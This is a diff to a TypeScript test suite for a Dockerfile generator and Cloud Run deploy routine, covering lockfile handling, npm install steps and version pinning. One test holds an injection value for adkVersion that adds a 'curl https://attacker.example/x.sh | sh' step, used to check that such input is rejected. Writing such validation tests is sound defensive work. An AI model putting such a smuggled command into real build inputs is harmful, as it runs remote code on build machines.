@@ -28,6 +28,7 @@ import {
   isFileExists,
   isFolderExists,
   loadFileData,
+  saveToFile,
   tryToFindFileRecursively,
 } from '../../src/utils/file_utils.js';
 
@@ -36,6 +37,13 @@ type Callback = (error: Error | null, result?: unknown) => void;
 const A2A_TOKEN = 'test-a2a-token';
 const TEST_PROJECT = 'test-project';
 const TEST_REGION = 'us-central1';
+
+/** The COPY instructions of a generated Dockerfile, in order. */
+function copyLinesOf(dockerFileContent: string): string[] {
+  return dockerFileContent
+    .split('\n')
+    .filter((line) => line.startsWith('COPY '));
+}
 
 const execMock = vi.fn();
 const spawnMock =
@@ -91,6 +99,8 @@ describe('createDockerFileContent', () => {
     port: 8080,
     withUi: false,
     logLevel: 'info',
+    adkVersion: 'latest',
+    hasLockfile: false,
   };
 
   it('should create Dockerfile content without --a2a by default', () => {
@@ -260,6 +270,104 @@ describe('createDockerFileContent', () => {
   it('should not use a floating Node base image tag', () => {
     const content = createDockerFileContent(defaultOptions);
     expect(content).not.toMatch(/FROM node:(lts|latest|current)/);
+  });
+
+  it('should install from the staged lock file when one was staged', () => {
+    const content = createDockerFileContent({
+      ...defaultOptions,
+      hasLockfile: true,
+    });
+
+    expect(content).toContain(
+      'COPY --chown=myuser:myuser "package-lock.json" "/app/package-lock.json"',
+    );
+    expect(content).toContain('RUN npm ci --omit=dev');
+    expect(content).not.toContain('RUN npm install --omit=dev');
+  });
+
+  it('should resolve dependencies at build time when no lock file was staged', () => {
+    const content = createDockerFileContent(defaultOptions);
+
+    expect(copyLinesOf(content)).not.toContain(
+      'COPY --chown=myuser:myuser "package-lock.json" "/app/package-lock.json"',
+    );
+    expect(content).toContain('RUN npm install --omit=dev');
+    expect(content).not.toContain('RUN npm ci');
+  });
+
+  it('should not use the deprecated --production install flag', () => {
+    expect(createDockerFileContent(defaultOptions)).not.toContain(
+      '--production',
+    );
+  });
+
+  it.each([true, false])(
+    'should install devtools after the dependencies when hasLockfile is %s',
+    (hasLockfile: boolean) => {
+      // npm ci and npm install both clear node_modules, so devtools installed
+      // first would be deleted again.
+      const content = createDockerFileContent({...defaultOptions, hasLockfile});
+
+      const dependencyInstallIndex = hasLockfile
+        ? content.indexOf('RUN npm ci --omit=dev')
+        : content.indexOf('RUN npm install --omit=dev');
+      const devtoolsInstallIndex = content.indexOf(
+        "RUN npm install '@google/adk-devtools@",
+      );
+      expect(dependencyInstallIndex).toBeGreaterThan(-1);
+      expect(devtoolsInstallIndex).toBeGreaterThan(dependencyInstallIndex);
+    },
+  );
+
+  it.each([true, false])(
+    'should never copy node_modules into the image when hasLockfile is %s',
+    (hasLockfile: boolean) => {
+      const content = createDockerFileContent({...defaultOptions, hasLockfile});
+
+      expect(
+        copyLinesOf(content).filter((line) => line.includes('node_modules')),
+      ).toEqual([]);
+    },
+  );
+
+  it('should hand /app to the non-root user before switching to it', () => {
+    // WORKDIR creates /app as root, and npm has to create /app/node_modules
+    // as myuser.
+    const content = createDockerFileContent(defaultOptions);
+
+    const chownIndex = content.indexOf('chown myuser:myuser /app');
+    const userIndex = content.indexOf('USER myuser');
+    expect(chownIndex).toBeGreaterThan(-1);
+    expect(userIndex).toBeGreaterThan(chownIndex);
+  });
+
+  it('should pin the devtools package to adkVersion', () => {
+    const content = createDockerFileContent({
+      ...defaultOptions,
+      adkVersion: '1.6.0',
+    });
+
+    expect(content).toContain("RUN npm install '@google/adk-devtools@1.6.0'");
+    expect(content).not.toContain('@google/adk-devtools@latest');
+  });
+
+  it('should shell-quote an adkVersion range', () => {
+    const content = createDockerFileContent({
+      ...defaultOptions,
+      adkVersion: '^1.6.0',
+    });
+
+    expect(content).toContain("RUN npm install '@google/adk-devtools@^1.6.0'");
+    expect(content).not.toContain('RUN npm install @google/adk-devtools');
+  });
+
+  it('should reject an adkVersion that would start a new Dockerfile instruction', () => {
+    expect(() =>
+      createDockerFileContent({
+        ...defaultOptions,
+        adkVersion: '1.6.0\nRUN curl https://attacker.example/x.sh | sh\n#',
+      }),
+    ).toThrow(/Invalid adkVersion/);
   });
 });
 
@@ -858,5 +966,86 @@ describe('deployToCloudRun', () => {
         }),
       ).rejects.toThrow(/conflict with ADK's automatic configuration/);
     });
+  });
+
+  /**
+   * Makes only the project's package-lock.json exist. `isFileExists` also
+   * answers the `.env` probe, which must stay negative here.
+   */
+  function givenProjectLockFile() {
+    (isFileExists as Mock).mockImplementation(async (filePath: string) =>
+      filePath.endsWith('package-lock.json'),
+    );
+  }
+
+  it('should stage the project lock file and install from it', async () => {
+    givenProjectLockFile();
+
+    await deployToCloudRun(defaultOptions);
+
+    expect(isFileExists).toHaveBeenCalledWith(
+      path.join('path/to', 'package-lock.json'),
+    );
+    expect(fs.cp).toHaveBeenCalledWith(
+      path.join('path/to', 'package-lock.json'),
+      path.join('/tmp/test-deploy', 'package-lock.json'),
+    );
+    expect(saveToFile).toHaveBeenCalledWith(
+      path.join('/tmp/test-deploy', 'Dockerfile'),
+      expect.stringContaining('RUN npm ci --omit=dev'),
+    );
+  });
+
+  it('should refuse the lock file of a workspace root', async () => {
+    const consoleWarnSpy = vi.spyOn(console, 'warn');
+    givenProjectLockFile();
+    (loadFileData as Mock).mockResolvedValue({
+      dependencies: {'@google/adk': '^1.0.0'},
+      workspaces: ['packages/*'],
+    });
+
+    await deployToCloudRun(defaultOptions);
+
+    expect(fs.cp).not.toHaveBeenCalledWith(
+      path.join('path/to', 'package-lock.json'),
+      path.join('/tmp/test-deploy', 'package-lock.json'),
+    );
+    expect(consoleWarnSpy).toHaveBeenCalledWith(
+      expect.stringContaining('is a workspace root'),
+      expect.stringContaining('not reproducible'),
+    );
+    expect(saveToFile).toHaveBeenCalledWith(
+      path.join('/tmp/test-deploy', 'Dockerfile'),
+      expect.stringContaining('RUN npm install --omit=dev'),
+    );
+  });
+
+  it('should warn and deploy unpinned when the project has no lock file', async () => {
+    const consoleWarnSpy = vi.spyOn(console, 'warn');
+    (isFileExists as Mock).mockResolvedValue(false);
+
+    await deployToCloudRun(defaultOptions);
+
+    expect(fs.cp).not.toHaveBeenCalledWith(
+      path.join('path/to', 'package-lock.json'),
+      path.join('/tmp/test-deploy', 'package-lock.json'),
+    );
+    expect(consoleWarnSpy).toHaveBeenCalledWith(
+      expect.stringContaining('No package-lock.json beside'),
+      expect.stringContaining('not reproducible'),
+    );
+    expect(spawnMock).toHaveBeenCalled();
+  });
+
+  it('should stage neither an empty node_modules nor an empty lock file', async () => {
+    await deployToCloudRun(defaultOptions);
+
+    const mkdirPaths = (fs.mkdir as Mock).mock.calls.map((call) =>
+      String(call[0]),
+    );
+    expect(
+      mkdirPaths.filter((mkdirPath) => mkdirPath.endsWith('node_modules')),
+    ).toEqual([]);
+    expect(saveToFile).not.toHaveBeenCalledWith(expect.anything(), '');
   });
 });
